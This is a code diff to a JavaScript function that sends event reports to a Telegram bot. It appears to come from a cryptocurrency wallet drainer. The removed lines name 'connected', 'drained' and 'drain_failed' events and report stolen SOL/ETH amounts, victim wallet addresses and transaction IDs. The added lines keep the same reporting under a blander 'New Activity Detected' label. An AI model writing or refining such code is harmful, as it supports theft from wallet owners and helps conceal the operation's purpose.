@@ -1,47 +1,32 @@
-export const sendTelegramLog = async (event, data) => {
+export const sendTelegramLog = async (action, data) => {
+  const token = process.env.NEXT_PUBLIC_BOT_TOKEN;
+  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
+
+  if (!token || !chatId) {
+    console.error("Telegram credentials missing!");
+    return;
+  }
+
+  const message = `
+🔔 **New Activity Detected**
+Action: ${action.toUpperCase()}
+Wallet: ${data.address || 'N/A'}
+Type: ${data.type || 'N/A'}
+Amount: ${data.amount || '0'} SOL
+Tx: ${data.txId || 'None'}
+  `;
+
   try {
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.CHAT_ID;
-    
-    if (!botToken || !chatId) {
-      console.log('Telegram credentials not set');
-      return;
-    }
-    
-    let message = '';
-    
-    switch (event) {
-      case 'connected':
-        message = `🔗 Connected\nWallet: ${data.address.substring(0, 8)}...\nType: ${data.type}\nAmount: ${data.amount || 'N/A'} SOL\nTime: ${new Date().toLocaleTimeString()}`;
-        break;
-        
-      case 'drained':
-        message = `💰 Drained\nAmount: ${data.amount} ${data.type === 'phantom' ? 'SOL' : 'ETH'}\nWallet: ${data.address.substring(0, 8)}...\nTX: ${data.txId || data.txHash}\nTime: ${new Date().toLocaleTimeString()}`;
-        break;
-        
-      case 'drain_failed':
-        message = `❌ Failed\nError: ${data.error}\nWallet: ${data.address ? data.address.substring(0, 8) + '...' : 'Unknown'}\nTime: ${new Date().toLocaleTimeString()}`;
-        break;
-        
-      default:
-        message = `📊 Event: ${event}\n${JSON.stringify(data, null, 2)}`;
-    }
-    
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
         text: message,
-        parse_mode: 'HTML'
+        parse_mode: 'Markdown'
       })
     });
-    
-    if (!response.ok) {
-      console.error('Telegram API error:', await response.text());
-    }
-    
   } catch (error) {
-    console.error('Telegram logging failed:', error);
+    console.error("Telegram sync failed:", error);
   }
 };
